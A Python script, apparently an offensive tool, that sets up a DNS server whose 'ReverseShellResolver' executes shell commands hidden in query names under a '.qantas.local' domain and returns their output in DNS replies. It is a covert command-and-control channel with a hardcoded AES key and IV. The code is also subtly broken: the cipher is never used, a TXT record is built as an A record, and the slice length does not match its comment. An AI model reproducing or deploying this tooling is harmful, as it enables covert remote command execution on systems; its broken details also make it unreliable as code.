from dnslib import DNSRecord, DNSHeader, QTYPE, A, RR
from dnslib.server import DNSServer, DNSHandler, BaseResolver
from base64 import b64decode
from Crypto.Cipher import AES
import socket
import subprocess

class ReverseShellResolver(BaseResolver):
    def __init__(self, key, iv):
        self.key = key
        self.iv = iv

    def resolve(self, request, handler):
        responses = []
        for question in request.questions:
            domain = str(question.q.qname)
            if domain.endswith('.qantas.local'):  # Replace 'your_domain_name' with the domain name used by the client
                command = domain[:-15]  # Remove the last 15 characters representing '.your_domain_name'
                output = self.execute_command(command)
                if output:
                    response = self.build_response(question, output)
                    responses.append(response)
        return responses

    def execute_command(self, command):
        try:
            result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
            return result.decode()
        except subprocess.CalledProcessError as e:
            return str(e.output.decode())

    def build_response(self, question, data):
        response = DNSRecord(DNSHeader(id=question.header.id, qr=1, aa=1, ra=1), q=question.q)
        response.add_answer(RR(rname=question.q.qname, rtype=QTYPE.TXT, rdata=A(data.encode())))
        return response

class CustomDNSHandler(DNSHandler):
    def handle(self):
        request = self.request
        responses = self.server.resolver.resolve(request, self)
        if responses:
            self.send_responses(responses)

def main():
    # Change the following values to match your listener's IP, port, encryption key, and IV
    ip = '0.0.0.0'
    port = 53
    key = b'dcUxcaC2ZOzW7Hkw8XT34V7H3Kasg4Lv'
    iv = b'923HTN9Zzl8uiscR'

    cipher = AES.new(key, AES.MODE_CBC, iv)

    resolver = ReverseShellResolver(key, iv)
    udp_server = DNSServer(resolver, port=53, address=ip, handler=CustomDNSHandler)

    print(f"[*] DNS server listening on {ip}:{port}")
    udp_server.start()

if __name__ == '__main__':
    main()
